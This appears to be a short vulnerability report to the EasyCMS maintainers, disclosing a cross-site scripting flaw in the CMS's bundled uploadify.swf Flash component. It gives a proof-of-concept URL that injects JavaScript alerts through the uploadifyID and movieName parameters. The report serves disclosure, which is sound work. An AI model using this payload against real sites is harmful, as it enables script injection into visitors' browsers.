HiÔºåteameasyÔºÅ

When I use your cms,I found a xss vuln in your component.Untrusted flash version is the key of the problem,i hope you can fix it soon.

POC:

[http://localhost/EasyCMS-master/App/Modules/Admin/Tpl/default/Public/dwz/uploadify/scripts/uploadify.swf?uploadifyID=00%22%29%29;}catch%28e%29{alert%281%29;}//%28%22&movieName=%22])}catch(e){if(!window.x){window.x=1;alert(2)}}](http://localhost/EasyCMS-master/App/Modules/Admin/Tpl/default/Public/dwz/uploadify/scripts/uploadify.swf?uploadifyID=00%22%29%29;%7Dcatch%28e%29%7Balert%281%29;%7D//%28%22&movieName=%22%5D)%7Dcatch(e)%7Bif(!window.x)%7Bwindow.x=1;alert(2)%7D%7D)

thx
